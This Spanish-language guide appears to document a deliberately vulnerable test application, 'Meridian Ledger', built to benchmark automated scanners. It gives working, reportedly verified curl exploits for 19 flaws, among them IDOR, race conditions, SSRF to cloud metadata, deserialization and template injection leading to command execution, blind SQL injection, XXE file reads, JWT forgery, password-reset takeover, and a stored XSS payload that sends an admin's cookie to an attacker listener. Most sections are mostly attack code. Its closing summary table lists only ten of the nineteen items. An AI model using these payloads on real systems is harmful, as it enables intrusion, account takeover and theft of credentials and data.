# Meridian Ledger — Documento de Arquitectura de Pruebas

Guía de explotación de las **9 vulnerabilidades** introducidas en el target. Para cada una:
**(a)** dónde vive en el código, **(b)** el vector de ataque exacto, **(c)** cómo explotarla a
mano con `curl`, y **(d)** por qué representa un reto para un escáner/pentester automatizado.

Todos los payloads de esta guía fueron **verificados contra una instancia en ejecución**.

---

## Preparación

```bash
BASE="https://tu-target.up.railway.app"   # o http://localhost:3000 en local

# Autentícate como la cuenta "atacante" (member, sin privilegios) y guarda la cookie de sesión.
curl -s -c cookies.txt -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@meridian.io","password":"Password123!"}'
```

A partir de aquí, todas las peticiones usan `-b cookies.txt`. Casi toda la superficie vulnerable
está **detrás de autenticación**: un escáner sin sesión válida no verá casi nada — este es el
primer motivo por el que muchas herramientas fallan aquí.

---

## 1 · IDOR ofuscado y dependiente de estado

**Código:** `src/routes/reports.js` · **Endpoints:** `POST /api/reports/open`,
`PATCH /api/reports/scope`, `GET /api/reports/render`

**Vector.** No existe ningún ID de objeto en la URL de lectura. El documento que se renderiza se
resuelve desde el **estado de sesión en el servidor** (`session.context.docRef`), que se fija en
un paso anterior. El paso `PATCH /api/reports/scope` sobrescribe ese `docRef` con **cualquier**
`doc_ref` que envíes, **sin re-verificar la propiedad** del documento. La lectura final
(`/render`) confía ciegamente en el contexto.

**Explotación.**

```bash
# (1) Abre un contexto de reporte (queda ligado a TU propio documento).
curl -s -b cookies.txt -X POST "$BASE/api/reports/open" \
  -H 'Content-Type: application/json' -d '{}'

# (2) Reapunta el contexto al doc_ref de la víctima (aquí, uno de Bob).
#     Los doc_ref son tokens opacos; se obtienen de otros flujos, listados o fuerza dirigida.
curl -s -b cookies.txt -X PATCH "$BASE/api/reports/scope" \
  -H 'Content-Type: application/json' \
  -d '{"doc_ref":"doc_fdbfeef709c677465b"}'

# (3) Renderiza: el servidor entrega el documento de la víctima, incluido el memo confidencial.
curl -s -b cookies.txt "$BASE/api/reports/render"
```

Respuesta (fuga real de otro tenant):

```json
{"doc_ref":"doc_fdbfeef709c677465b","owner":"bob@meridian.io",
 "counterparty":"Project Halcyon (confidential)","amount":950000,"status":"pending",
 "private_memo":"CONFIDENTIAL: acquisition escrow, do not disclose. Wire ref 88-XY-2231."}
```

**Por qué evade la automatización.** Los detectores de IDOR clásicos mutan identificadores
**dentro de la misma petición** (`/invoices/1` → `/invoices/2`) y comparan respuestas. Aquí el
identificador (i) no está en la URL de lectura, (ii) es un token no secuencial, y (iii) el fallo
solo aparece tras una **secuencia con estado de 3 peticiones** (`open` → `scope` → `render`). Un
crawler stateless prueba `/render` de forma aislada, obtiene su propio documento, y concluye que
el control de acceso es correcto.

---

## 2 · Race Condition (sin bloqueo transaccional)

**Código:** `src/routes/coupons.js` (`/redeem`) y `src/routes/wallet.js` (`/transfer`)

**Vector.** Patrón *read-check-write* sin lock ni transacción atómica. `redeem` lee
`remaining_uses`, comprueba `> 0`, hace un round-trip asíncrono (simulando el proveedor de pago)
y **luego** decrementa. Con N peticiones concurrentes, todas leen el mismo valor antes de que
ninguna escriba (TOCTOU).

**Explotación** (cupón de un solo uso, disparado 10 veces en paralelo):

```bash
for i in $(seq 1 10); do
  curl -s -b cookies.txt -X POST "$BASE/api/coupons/redeem" \
    -H 'Content-Type: application/json' -d '{"code":"WELCOME50"}' &
done; wait
```

Resultado observado: **10 redenciones exitosas** de un cupón `remaining_uses=1`, quedando
`remaining_uses = -9` y los créditos subiendo de 250 a 750 (deberían ser +50, no +500). El mismo
patrón permite sobre-girar el saldo con transferencias concurrentes (`POST /api/wallet/transfer`).

**Por qué evade la automatización.** Los escáneres emiten peticiones **secuenciales**; enviadas
así, el endpoint se comporta perfectamente (segunda redención → `409`). El defecto solo se
manifiesta bajo **concurrencia real**, algo que casi ninguna herramienta de scanning genérica
orquesta. Además no hay firma sintáctica: cada petición individual es legítima.

---

## 3 · Blind SSRF hacia metadatos de nube / red interna

**Código:** `src/lib/fetchUrl.js` + `src/routes/webhooks.js`
**Endpoints:** `POST /api/webhooks`, `POST /api/webhooks/test`

**Vector.** El servidor hace una petición HTTP **server-side** a la URL que envíes para
"validar que es alcanzable", sin lista blanca ni filtrado de `localhost`, rangos privados
(RFC1918) ni la IP de metadatos de nube `169.254.169.254`. La respuesta al cliente es **ciega**:
solo un estado (`validated` / `unreachable`), nunca el cuerpo.

**Explotación.**

```bash
# Alcanza un servicio INTERNO (aquí, la propia app) -> demuestra ausencia de filtro SSRF:
curl -s -b cookies.txt -X POST "$BASE/api/webhooks/test" \
  -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:3000/healthz"}'
# {"reachable":true,"status":"validated"}

# Metadatos AWS (IMDS). En AWS devolvería credenciales del rol de instancia:
curl -s -b cookies.txt -X POST "$BASE/api/webhooks/test" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# GCP (requiere cabecera Metadata-Flavor, no aplica aquí pero el host es alcanzable):
#   http://metadata.google.internal/computeMetadata/v1/
```

Como es **ciego**, la validación real se hace *out-of-band*: apunta la URL a un listener tuyo
(Burp Collaborator, `interactsh`, o un simple `nc -lvnp`/webhook.site) y confirma el hit entrante.

**Por qué evade la automatización.** No hay reflexión: el cuerpo de la respuesta nunca vuelve, y
`validated`/`unreachable` es idéntico para éxitos interesantes y para ruido. Detectarlo exige
**infraestructura OOB** correlacionada con la petición. Muchos escáneres sin colaborador OOB
integrado, o que solo buscan SSRF por diferencias en el cuerpo de la respuesta, lo pasan por alto.

---

## 4 · Mass Assignment (sin DTO / sin allow-list de privilegios)

**Código:** `src/routes/users.js` · **Endpoint:** `PUT /api/users/me`

**Vector.** El handler copia al registro del usuario **cualquier** campo del JSON que coincida
con una columna, incluidas `role`, `is_admin`, `credits` y `balance`. No hay DTO ni separación
entre campos editables por el usuario y campos privilegiados.

**Explotación** (auto-escalada a admin + inflar saldo/créditos):

```bash
curl -s -b cookies.txt -X PUT "$BASE/api/users/me" \
  -H 'Content-Type: application/json' \
  -d '{"name":"Alice","role":"admin","is_admin":1,"credits":99999,"balance":1000000}'
```

Respuesta: `"role":"admin","is_admin":true,"credits":99999` — el usuario member se convierte en
administrador.

**Por qué evade la automatización.** Los campos peligrosos **no aparecen** en el formulario ni en
ningún esquema público; un fuzzer no sabe que existen `is_admin`/`role` a menos que los adivine.
La respuesta es un objeto de perfil de aspecto normal (200 OK), sin error ni reflexión anómala
que dispare una firma. Es un fallo semántico, no sintáctico.

---

## 5 · Prototype Pollution → escalada de privilegios (cadena)

**Código:** `src/lib/deepmerge.js` + `src/routes/settings.js`; gadget en `src/routes/admin.js`
**Endpoints:** `POST /api/settings` (sink) → `GET /api/admin/metrics` (impacto)

**Vector.** `POST /api/settings` aplica un **merge recursivo inseguro** del JSON del usuario
sobre sus preferencias. Inyectando `__proto__` se contamina `Object.prototype` de todo el
proceso. El endpoint admin comprueba autorización con `getAccessLevel(user).canViewAdmin`, donde
`acl` es un objeto vacío `{}` para no-admins — tras la contaminación, `acl.canViewAdmin` se
resuelve por el prototipo a `true`.

**Explotación** (cadena de 2 pasos):

```bash
# Antes: acceso denegado
curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt "$BASE/api/admin/metrics"   # 403

# (1) Contamina el prototipo con la propiedad-gadget:
curl -s -b cookies.txt -X POST "$BASE/api/settings" \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"canViewAdmin":true}}'

# (2) Ahora el gate de admin se evalúa como true -> fuga de datos de toda la organización:
curl -s -b cookies.txt "$BASE/api/admin/metrics"   # 200 + balances de todos los usuarios
```

(Variante equivalente si `__proto__` está saneado en algún punto:
`{"constructor":{"prototype":{"canViewAdmin":true}}}`.)

**Por qué evade la automatización.** El sink (`POST /api/settings`) responde **200 OK sin ninguna
anomalía** — no hay reflexión ni error que detectar. El impacto se materializa en **otro
endpoint** y solo si el escáner conoce la **propiedad-gadget** concreta (`canViewAdmin`) y encadena
ambas llamadas en la sesión correcta. Los detectores genéricos de prototype pollution suelen
buscar propiedades reflejadas (`__proto__.foo` devuelto en la respuesta) o crashes; aquí no hay
ninguno de los dos.

---

## 6 · Deserialización insegura → RCE

**Código:** `src/lib/unserialize.js` + `src/routes/restore.js` · **Endpoint:** `POST /api/session/restore`

**Vector.** La función "restaurar workspace" decodifica un blob Base64 y lo pasa por un
deserializador que **rehidrata funciones con `eval()`** (patrón `node-serialize`: los valores con
el marcador `_$$ND_FUNC$$_` se evalúan). Una IIFE `(function(){...})()` se ejecuta durante la
propia deserialización → ejecución remota de código.

**Explotación** (crea un archivo en el contenedor como prueba de RCE):

```bash
# Construye el blob Base64 con el payload IIFE:
BLOB=$(python3 - <<'PY'
import json, base64
marker = '_$$ND_FUNC$$_'
fn = "function(){ require('child_process').execSync('id > /tmp/pwned; touch /tmp/PWNED'); return 'ok'; }()"
print(base64.b64encode(json.dumps({"email":"x","context": marker+fn}).encode()).decode())
PY
)

curl -s -b cookies.txt -X POST "$BASE/api/session/restore" \
  -H 'Content-Type: application/json' -d "{\"state\":\"$BLOB\"}"
```

Verificado: el archivo `/tmp/PWNED` se crea en el servidor. Sustituye el comando por una
reverse shell / beacon OOB para confirmar el RCE de forma remota. Nota: `/api/session/export`
devuelve un blob válido de ejemplo, útil para entender el formato antes de manipularlo.

**Por qué evade la automatización.** El punto de inyección es un **blob Base64 opaco** en el
cuerpo JSON. Los fuzzers rara vez decodifican Base64, entienden su estructura interna e inyectan
un payload de función con el marcador exacto de `node-serialize`. Sin ese conocimiento específico
del serializador, el endpoint parece un simple importador de estado.

---

## 7 · HTTP Parameter Pollution (discrepancia middleware ↔ ORM)

**Código:** `src/routes/accounts.js` · **Endpoint:** `GET /api/accounts/balance`

**Vector.** Con un parámetro duplicado, el parser de Express (`qs`) entrega un **array**. El
middleware de autorización valida el **primer** valor (`account_id[0]`, tu propia cuenta → pasa),
pero la capa de datos normaliza tomando el **último** valor (`[].concat(raw).pop()`, la cuenta de
la víctima). El guard y el ORM leen parámetros distintos de la misma petición.

**Explotación.**

```bash
# Un solo valor de la víctima -> correctamente denegado:
curl -s -b cookies.txt "$BASE/api/accounts/balance?account_id=ACC-4022"
# {"error":"not authorized for that account"}

# Parámetro duplicado: authz ve ACC-4021 (tuya), el ORM devuelve ACC-4022 (de la víctima):
curl -s -b cookies.txt "$BASE/api/accounts/balance?account_id=ACC-4021&account_id=ACC-4022"
# {"account_ref":"ACC-4022","label":"Treasury — Bob","balance":88450.1,"owner":"bob@meridian.io"}
```

**Por qué evade la automatización.** Con valores **únicos** el control de acceso funciona
perfectamente, así que las pruebas de autorización estándar pasan. Explotarlo exige (i) **duplicar**
el parámetro y (ii) conocer la **discrepancia de parsing** entre `first()` (middleware) y `last()`
(ORM). Los escáneres que envían un valor por parámetro nunca disparan la condición.

---

## 8 · Fallo de lógica de negocio (cantidad negativa + saltar el pago)

**Código:** `src/routes/checkout.js` · **Endpoints:** `POST /api/checkout/cart`, `/pay`, `/receipt`

**Vector A — cantidades negativas.** El total del carrito es `Σ qty·price` sin validar `qty > 0`.
Una línea con cantidad negativa **resta** del total, permitiendo llevarlo a `0` o negativo.

```bash
curl -s -b cookies.txt -X POST "$BASE/api/checkout/cart" \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"sku":"PRO","qty":1,"price":500},{"sku":"HACK","qty":-100,"price":10}]}'
# {"subtotal":-500, ...}
```

**Vector B — saltar la confirmación de pago.** El flujo previsto es `cart → pay → receipt`. Pero
`/receipt` **provisiona los créditos comprados sin verificar** que `/pay` se haya llamado
(`cart.paid` se ignora):

```bash
curl -s -b cookies.txt -X POST "$BASE/api/checkout/cart" \
  -H 'Content-Type: application/json' -d '{"items":[{"sku":"CREDIT","qty":50,"price":10}]}'

# Se salta /pay y va directo al recibo -> 50 créditos provisionados, amount_charged=null:
curl -s -b cookies.txt -X POST "$BASE/api/checkout/receipt" \
  -H 'Content-Type: application/json' -d '{}'
# {"status":"PAID","amount_charged":null,"units_provisioned":50, ...}
```

**Por qué evade la automatización.** Es lógica pura de negocio: **cada petición es individualmente
válida** (JSON bien formado, tipos correctos, 200 OK). No hay inyección, ni metacaracteres, ni
firma. Detectarlo requiere **modelar la máquina de estados esperada** del checkout y razonar sobre
invariantes económicas (totales no-negativos, pago-antes-de-entrega) — algo fuera del alcance de
los escáneres basados en firmas.

---

## 9 · SQL Injection ciega basada en tiempo (en `ORDER BY` y en cabecera)

**Código:** `src/routes/transactions.js` (cláusula `ORDER BY`) y `src/audit.js` (cabecera
`X-Forwarded-For`)

**Vector.** Dos puntos donde la entrada se **concatena** en SQL, ambos sin reflexión y con errores
silenciados (verdaderamente ciegos):

- `GET /api/transactions?sort=…&dir=…` compone `... ORDER BY <sort> <dir>`. No es un contexto
  entrecomillado, así que las firmas clásicas de romper-comilla (`' OR 1=1`) no aplican.
- El middleware de auditoría ejecuta `... WHERE client_ip = '<X-Forwarded-For>'` en **cada** llamada
  a `/api`, dentro de un `try/catch` que traga cualquier error.

Como la base es **SQLite**, no existe `pg_sleep()`/`SLEEP()`/`WAITFOR`. El retardo se induce con
una **CTE recursiva pesada** (equivalente funcional del sleep en SQLite).

**Explotación — vía `ORDER BY`** (usa `--data-urlencode`: el `+` de `x+1` debe ir como `%2B`):

```bash
# Baseline (~0.01 s):
curl -s -G -b cookies.txt "$BASE/api/transactions" \
  --data-urlencode "sort=created_at" --data-urlencode "dir=DESC" -o /dev/null -w "%{time_total}s\n"

# Inyección: subconsulta pesada en ORDER BY -> ~1.2 s de retardo medible:
curl -s -G -b cookies.txt "$BASE/api/transactions" \
  --data-urlencode "sort=(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 20000000) SELECT x FROM c))" \
  --data-urlencode "dir=DESC" -o /dev/null -w "%{time_total}s\n"
```

Para exfiltrar bit a bit, condiciona el retardo:
`sort=CASE WHEN (SELECT substr(password,1,1) FROM users WHERE email='admin@meridian.io')='M' THEN (<CTE pesada>) ELSE 1 END`.

**Explotación — vía `X-Forwarded-For`** (cabecera, sin url-encoding; nota el `-- ` final que
comenta la comilla de cierre, y evita colas siempre-verdaderas tipo `OR '1'='1'` que el optimizador
podría cortocircuitar):

```bash
curl -s -b cookies.txt "$BASE/api/wallet" -o /dev/null -w "%{time_total}s\n" \
  -H "X-Forwarded-For: z' OR (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 20000000) SELECT x FROM c)) >= 0 -- "
# baseline ~0.00 s  vs  inyección ~1.3 s
```

**Por qué evade la automatización.** Cuatro obstáculos combinados: (1) la inyección está en
`ORDER BY` y en una **cabecera** (`X-Forwarded-For`), superficies que muchos escáneres fuzzean de
forma superficial; (2) es **ciega y basada en tiempo** — sin errores (se tragan) ni datos
reflejados, el único oráculo es el retardo; (3) al ser **SQLite**, los payloads de sleep habituales
(`pg_sleep`, `SLEEP`, `WAITFOR DELAY`) **no funcionan**, y una herramienta que no pruebe un
primitivo de retardo específico de SQLite no obtiene señal; (4) el cortocircuito del optimizador
penaliza los payloads booleanos ingenuos. Se necesita una inyección adaptada al motor y a la
cláusula.

---

---

# Conjunto avanzado (10–19)

Segunda tanda de vulnerabilidades, de dificultad superior: cadenas que escalan a **RCE**,
técnicas de **bypass** (obligan a probar variantes, no solo el caso base) e inyecciones de
**segundo orden**. Todos los payloads fueron verificados contra la instancia en ejecución.

---

## 10 · Bypass del filtro SSRF (redirección y rango no cubierto)

**Código:** `src/lib/ssrfGuard.js` + `src/routes/documents.js` · **Endpoint:** `POST /api/documents/fetch`

**Vector.** A diferencia del webhook (sin filtro), este importador **sí** tiene una lista negra
de hosts (`169.254.169.254`, `localhost`, `127.0.0.1`, `metadata.google.internal`). Pero:
(a) solo valida el **primer** salto — los **redirects 3xx se siguen sin revalidar**; y
(b) la lista es de **cadenas literales** — no cubre rangos privados, ni loopback alternativo
(`127.0.0.2`), ni codificaciones (decimal/octal/hex), ni `0.0.0.0` / `[::]` / IPv6-mapped.

**Explotación.**

```bash
# Directo al host bloqueado -> rechazado (el filtro existe):
curl -s -b cookies.txt -X POST "$BASE/api/documents/fetch" \
  -H 'Content-Type: application/json' -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
# {"ok":false,"status":"blocked-by-policy"}

# Bypass por redirección: apunta a un host TUYO que responde 302 -> 169.254.169.254.
# El guard valida solo el primer host (el tuyo) y sigue el redirect sin revalidar:
curl -s -b cookies.txt -X POST "$BASE/api/documents/fetch" \
  -H 'Content-Type: application/json' -d '{"url":"http://tu-servidor.example/redir-to-imds"}'
# {"ok":true,"status":"imported","hops":1}   (alcanzó el destino interno)
```

Verificado en laboratorio: un redirector en `127.0.0.2` (loopback **no** listado) que devuelve
`302 → http://127.0.0.1:9101/` alcanzó el objetivo interno bloqueado. Como es **ciego**, confirma
el hit con un listener propio (`interactsh`/Collaborator/`nc`).

**Por qué evade la automatización.** El escáner que solo prueba `169.254.169.254` **crudo** ve un
`blocked-by-policy` y concluye que hay defensa. Detectar el fallo exige probar **variantes de
evasión** (redirect, loopback alternativo, codificaciones de IP) y disponer de infraestructura OOB
para confirmar el salto ciego. Es exactamente el tipo de creatividad que las firmas estáticas no
tienen.

---

## 11 · XXE (lectura de archivos en banda + XXE ciego → OOB)

**Código:** `src/lib/xml.js` + `src/routes/documents.js` · **Endpoint:** `POST /api/documents/import-xml`

**Vector.** El importador de facturas XML expande entidades, incluidas **entidades externas**
`SYSTEM`. Resuelve `file://` leyendo del disco y `http(s)://` haciendo una petición server-side.
Sin `DOCTYPE`-whitelisting ni deshabilitado de entidades externas.

**Explotación — lectura de archivos (en banda):**

```bash
curl -s -b cookies.txt -X POST "$BASE/api/documents/import-xml" -H 'Content-Type: text/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]><records><item>&x;</item></records>'
# El contenido del archivo aparece expandido en "preview"/records.
```

**Explotación — XXE ciego → SSRF/OOB (p. ej. metadatos de nube):**

```bash
curl -s -b cookies.txt -X POST "$BASE/api/documents/import-xml" -H 'Content-Type: text/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><records><item>&x;</item></records>'
# La petición server-side se dispara aunque el contenido no se refleje (confirma OOB con tu listener).
```

Verificado: `file:///etc/hostname` devolvió el hostname en banda; una entidad
`http://127.0.0.2:9103/…` golpeó el listener externo (XXE→SSRF ciego).

**Por qué evade la automatización.** La inyección va en un **cuerpo XML** con una sintaxis de DTD
específica (`<!DOCTYPE … <!ENTITY … SYSTEM …>>`). Los fuzzers que tratan el body como texto plano
o JSON no construyen el DTD correcto; y la variante ciega (OOB) no deja rastro en la respuesta.

---

## 12 · Prototype Pollution → RCE (cadena de contaminación a ejecución)

**Código:** `src/lib/deepmerge.js` (sink) + `src/routes/exports.js` (gadget)
**Endpoints:** `POST /api/settings` → `POST /api/exports/run`

**Vector.** El mismo merge inseguro de la #5, pero aquí la propiedad-gadget es `converter`. El
exportador construye el comando a ejecutar tomando el binario por defecto de un objeto de config
`{}` (`cfg.converter || 'echo'`). Tras contaminar `Object.prototype.converter`, ese valor se
convierte en el comando que ejecuta `execSync` → **RCE real**.

**Explotación** (cadena de 2 pasos):

```bash
# (1) Contamina el prototipo con el comando:
curl -s -b cookies.txt -X POST "$BASE/api/settings" -H 'Content-Type: application/json' \
  -d '{"__proto__":{"converter":"touch /tmp/PP_RCE_MARKER ;"}}'

# (2) Dispara el exportador -> el comando inyectado se ejecuta en el servidor:
curl -s -b cookies.txt -X POST "$BASE/api/exports/run" -H 'Content-Type: application/json' \
  -d '{"format":"csv"}'
```

Verificado: `/tmp/PP_RCE_MARKER` se creó en el contenedor. Sustituye por una reverse shell para RCE
remoto. Es una **escalada** de la #5: la misma primitiva de PP, ahora a ejecución de código.

**Por qué evade la automatización.** El sink (settings) responde 200 sin anomalía; el impacto está
en **otro endpoint** y depende de conocer la **propiedad-gadget** (`converter`) que un `child_process`
lee más tarde. Encadenar PP→RCE requiere entender ambos extremos del gadget, algo fuera del alcance
de la detección por firmas.

---

## 13 · SSTI (Server-Side Template Injection) → RCE

**Código:** `src/lib/template.js` + `src/routes/templates.js` · **Endpoint:** `POST /api/templates/preview`

**Vector.** El editor de plantillas de recibo compila la plantilla del usuario a un *template
literal* de JS y la evalúa (`new Function`). Cualquier expresión dentro de `${ ... }` se ejecuta en
el servidor.

**Explotación:**

```bash
curl -s -b cookies.txt -X POST "$BASE/api/templates/preview" -H 'Content-Type: application/json' \
  -d '{"template":"Hola ${data.user} — ${global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()}"}'
# "rendered":"Hola Alice Moreno — uid=... gid=..."   -> ejecución de comandos confirmada
```

**Por qué evade la automatización.** Requiere reconocer que el campo es una **plantilla evaluada**
(no un simple string) e inyectar sintaxis específica del motor (`${...}` con acceso a `process`).
Los detectores de XSS/inyección genéricos no prueban gadgets de plantilla server-side.

---

## 14 · JWT: `alg:none` y confusión de clave RS256 → HS256

**Código:** `src/lib/jwt.js` + `src/routes/token.js` + `src/routes/v2.js`
**Endpoints:** `POST /api/auth/token`, `GET /api/auth/jwks`, `GET /api/v2/admin`

**Vector.** La API v2 se autoriza **solo por el claim `role`** del JWT. El verificador es defectuoso:
acepta `alg:"none"` sin firma; para `HS256` usa la **clave pública** (publicada en `/api/auth/jwks`)
como secreto HMAC (confusión RS256→HS256); y **nunca valida `exp`**.

**Explotación — `alg:none`:**

```bash
# Cabecera {"alg":"none","typ":"JWT"} . payload {"sub":"x","role":"admin"} . (firma vacía)
H=$(printf '{"alg":"none","typ":"JWT"}' | basenc --base64url | tr -d '=')
P=$(printf '{"sub":"alice@meridian.io","role":"admin"}' | basenc --base64url | tr -d '=')
curl -s -H "Authorization: Bearer $H.$P." "$BASE/api/v2/admin"   # 200 + datos de toda la org
```

**Explotación — confusión de clave (HS256 firmado con la clave pública):**

```bash
PEM=$(curl -s "$BASE/api/auth/jwks")          # la clave pública está publicada
# Firma un JWT HS256 usando ese PEM como secreto HMAC -> el verificador lo acepta.
# (con jwt_tool:  jwt_tool <token> -X k -pk pub.pem   /  -I -pc role -pv admin)
```

Verificado: token RS256 legítimo (role=member) → **403**; `alg:none` con role=admin → **200**;
HS256 con la clave pública → **200** (fuga de balances de todos los usuarios).

**Por qué evade la automatización.** Muchos escáneres detectan `alg:none` genérico, pero la
**confusión de clave** exige tomar la clave pública de `/jwks` y re-firmar — un paso de varias
etapas específico de JWT. Y como `exp` no se valida, no hay señal temporal. La autorización por
claim (sin comprobación server-side del rol real) es un fallo puramente lógico.

---

## 15 · Reset de contraseña: Host poisoning + token predecible → account takeover

**Código:** `src/routes/password.js` · **Endpoints:** `POST /api/auth/forgot`, `POST /api/auth/reset`

**Vector.** Dos fallos combinables: (a) el enlace de reset se construye con el **Host /
X-Forwarded-Host** de la petición (controlable por el atacante) → *poisoning* del enlace enviado a
la víctima; (b) el token es **determinista**: `md5(email + minuto_actual + "meridian")[:16]`, así
que se puede **calcular** para cualquier cuenta sin recibir el correo.

**Explotación — takeover con token forjado:**

```bash
# (1) Dispara el envío (crea el registro de reset del lado servidor):
curl -s -X POST "$BASE/api/auth/forgot" -H 'Content-Type: application/json' \
  -H 'X-Forwarded-Host: attacker.evil' -d '{"email":"bob@meridian.io"}'

# (2) Calcula el token predecible (mismo algoritmo) y resetea la contraseña de la víctima:
MIN=$(python3 -c "import time;print(int(time.time()//60))")
TOK=$(python3 -c "import hashlib;print(hashlib.md5(f'bob@meridian.io:$MIN:meridian'.encode()).hexdigest()[:16])")
curl -s -X POST "$BASE/api/auth/reset" -H 'Content-Type: application/json' \
  -d "{\"email\":\"bob@meridian.io\",\"token\":\"$TOK\",\"new_password\":\"pwned123\"}"
# -> ahora inicias sesión como bob con "pwned123"
```

Verificado: el enlace en logs apuntaba a `https://attacker.evil/...` (poisoning) y el token forjado
permitió tomar la cuenta de Bob.

**Por qué evade la automatización.** El Host poisoning no produce error ni reflexión observable
en la respuesta del atacante (el daño está en el correo de la víctima). La predictibilidad del
token exige **modelar el algoritmo** de generación, no solo fuzzear. Ambos son fallos de diseño,
sin firma.

---

## 16 · CORS mal configurado (refleja Origin + credenciales)

**Código:** `server.js` (middleware CORS) · **Aplica a:** cualquier endpoint

**Vector.** El servidor **refleja** el `Origin` recibido en `Access-Control-Allow-Origin` y añade
`Access-Control-Allow-Credentials: true`. Cualquier web puede hacer peticiones autenticadas
cross-site y **leer la respuesta** (robo de datos con la cookie de sesión de la víctima).

**Explotación:**

```bash
curl -s -D - -o /dev/null -b cookies.txt -H 'Origin: https://evil.example' "$BASE/api/auth/me"
# Access-Control-Allow-Origin: https://evil.example
# Access-Control-Allow-Credentials: true
```

Un `fetch('$BASE/api/...', {credentials:'include'})` desde `evil.example` leería datos privados
de cualquier usuario logueado que visite la página del atacante.

**Por qué evade la automatización.** Muchos escáneres solo marcan `Access-Control-Allow-Origin: *`.
La **reflexión** de un origin arbitrario **con credenciales** es más sutil y a menudo se pasa como
"configurado". El impacto real requiere razonar sobre el modelo de confianza cross-origin.

---

## 17 · Session fixation

**Código:** `src/session.js` + `src/routes/auth.js` · **Endpoint:** `POST /api/auth/login`

**Vector.** Si el cliente ya presenta una cookie `sid` al hacer login, el servidor la **reutiliza**
en vez de rotarla. Un atacante que fije un `sid` conocido en el navegador de la víctima (p. ej. vía
el XSS #19 o un subdominio) obtiene una sesión válida en cuanto la víctima se autentica.

**Explotación:**

```bash
# El atacante fija un sid; tras el login de la víctima, ese MISMO sid queda autenticado:
curl -s -b 'sid=ATTACKER_FIXED_0xdead' -X POST "$BASE/api/auth/login" \
  -H 'Content-Type: application/json' -d '{"email":"bob@meridian.io","password":"..."}'
curl -s -b 'sid=ATTACKER_FIXED_0xdead' "$BASE/api/auth/me"   # -> bob@meridian.io
```

Verificado: `/api/auth/me` con el `sid` elegido por el atacante devuelve la identidad de la víctima.

**Por qué evade la automatización.** No hay payload ni error: la petición de login es normal y
responde 200. Detectarlo exige comparar el `sid` **antes y después** del login y razonar sobre
rotación de sesión — lógica de estado que los escáneres de firmas no modelan.

---

## 18 · SQL Injection de segundo orden

**Código:** `src/routes/users.js` (fuente) + `src/routes/reports.js` (sink)
**Endpoints:** `PUT /api/users/me` (nickname) → `GET /api/reports/summary`

**Vector.** El `nickname` se guarda de forma **parametrizada** (seguro en la escritura), pero el
endpoint de resumen lo **concatena** después en `... memo LIKE '%<nickname>%'`. El payload se
"planta" en una petición y **detona en otra** (segundo orden), ciego y basado en tiempo (SQLite).

**Explotación:**

```bash
# (1) Planta el payload en el perfil (se almacena sin ejecutarse):
curl -s -b cookies.txt -X PUT "$BASE/api/users/me" -H 'Content-Type: application/json' \
  -d "{\"nickname\":\"%' OR (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 20000000) SELECT x FROM c)) >= 0 -- \"}"

# (2) Detona en el endpoint de resumen -> retardo medible (~1.3 s vs ~0 s):
curl -s -b cookies.txt -o /dev/null -w "%{time_total}s\n" "$BASE/api/reports/summary"
```

Verificado: baseline ~0.00 s → con payload plantado ~1.27 s.

**Por qué evade la automatización.** El punto de inyección (`nickname`) parece **inofensivo y
seguro** al escanearlo (escritura parametrizada, sin error, sin reflexión). El fallo solo aparece
en un endpoint **distinto** que lee ese dato — una correlación fuente→sink entre dos peticiones que
los escáneres stateless no siguen.

---

## 19 · XSS almacenado ciego (dispara en el panel admin)

**Código:** `src/routes/support.js` (fuente) + `public/admin.html` (sink) + `GET /api/admin/tickets`
**Endpoint:** `POST /api/support`

**Vector.** Un miembro sin privilegios crea un ticket de soporte cuyo `subject`/`body` se
almacenan **sin sanear**. La consola de administración (`/admin.html`) los pinta con `innerHTML`
(sin escapar). El payload se ejecuta **en el navegador del admin** cuando abre la cola — XSS
almacenado **ciego** (out-of-band respecto al atacante).

**Explotación:**

```bash
curl -s -b cookies.txt -X POST "$BASE/api/support" -H 'Content-Type: application/json' \
  -d '{"subject":"Bug","body":"<img src=x onerror=fetch(`https://tu-listener/`+document.cookie)>"}'
# Cuando un admin abre /admin.html, el onerror se dispara y exfiltra su cookie a tu listener.
```

Verificado: el payload vuelve **crudo** (sin escapar) en `GET /api/admin/tickets`, y `admin.html`
lo inserta vía `innerHTML`. Confirma la ejecución con un navegador headless / tu listener OOB.

**Por qué evade la automatización.** Es **ciego y de segundo orden**: el atacante no ve ninguna
reflexión al enviarlo (la fuente responde 200 "ticket submitted"). Solo ejecuta en un **contexto
privilegiado distinto** (la sesión del admin) y en otro momento, algo que un escáner que busca
reflexión inmediata en su propia respuesta no observa.

---

## Resumen para el escáner

| # | Clase | Señal ausente que despista al escáner |
|---|-------|----------------------------------------|
| 1 | IDOR ofuscado | Sin ID en la URL; requiere secuencia con estado de 3 pasos |
| 2 | Race condition | Correcto en secuencial; falla solo bajo concurrencia |
| 3 | Blind SSRF | Sin reflexión; requiere confirmación out-of-band |
| 4 | Mass assignment | Campos privilegiados ocultos; respuesta 200 normal |
| 5 | Prototype pollution | Sink sin anomalía; impacto en otro endpoint; gadget concreto |
| 6 | Deserialización → RCE | Punto de inyección en blob Base64 opaco |
| 7 | HPP | Correcto con valor único; requiere duplicar parámetro |
| 8 | Lógica de negocio | Cada request es válido; sin firma sintáctica |
| 9 | SQLi ciega por tiempo | En `ORDER BY`/cabecera, ciega, y específica de SQLite |
| 10 | Bypass SSRF | El caso base está bloqueado; requiere probar redirect / rangos / codificaciones |
